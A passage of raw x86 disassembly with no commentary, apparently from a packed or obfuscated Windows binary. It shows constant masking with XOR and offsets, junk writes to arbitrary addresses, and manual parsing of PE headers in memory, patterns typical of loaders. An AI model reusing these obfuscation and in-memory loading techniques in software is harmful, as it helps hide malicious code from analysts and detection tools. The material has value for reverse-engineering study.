  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
